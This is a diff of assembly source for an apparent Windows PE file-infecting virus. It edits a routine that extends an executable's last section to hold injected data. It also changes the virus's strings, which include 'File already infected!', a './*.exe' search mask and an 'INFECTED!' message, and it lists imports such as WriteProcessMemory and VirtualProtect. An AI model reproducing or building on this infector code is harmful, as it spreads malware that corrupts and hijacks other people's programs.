@@ -433,12 +433,6 @@ ExtendLastSection proc CurrentStdcallNotation pe:cword, additionalSize:cword, rv
 	mov cax, cax
 	mov eax, [cax].IMAGE_SECTION_HEADER.Misc.VirtualSize
 	invoke SectionAlignment, cax, [alignment]
-	
-	pop cdx
-	sub cdx, cax
-	add cdx, 1000h ; чтоб VirtualProtect(addr,1000,...) в расширенном пространстве не попадал за пределы доступной памяти
-	invoke SectionAlignment, cdx, [alignment]
-	mov cdx, cax
 
 	mov cax, [pe]
 	mov cax, [cax].PeParser.nthead
@@ -452,10 +446,6 @@ ExtendLastSection proc CurrentStdcallNotation pe:cword, additionalSize:cword, rv
 	mov [cdx].IMAGE_SECTION_HEADER.SizeOfRawData, eax
 	
 	; lastSection->Misc.VirtualSize = newVirtualAndFileSize;
-	push cdx
-	add eax, 1000h
-	invoke SectionAlignment, cax, [alignment]
-	pop cdx
 	mov [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, eax
 	
 	;*rvaNewData = lastSection->VirtualAddress + offsetToNewSectionData;
@@ -664,7 +654,7 @@ db "ERROR: File already infected!", 10, 0
 exe_file_mask:
 db "./*.exe", 0
 msg_done:
-db "Infected", 0
+db "INFECTED!", 0
 
 DefineFuncNamesAndPointers WriteProcessMemory, CreateFileMappingA, VirtualProtect, MessageBoxA, printf, strlen, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, GetFileSize, CreateFileMapping, CloseHandle,  MapViewOfFile, UnmapViewOfFile, memcpy
 
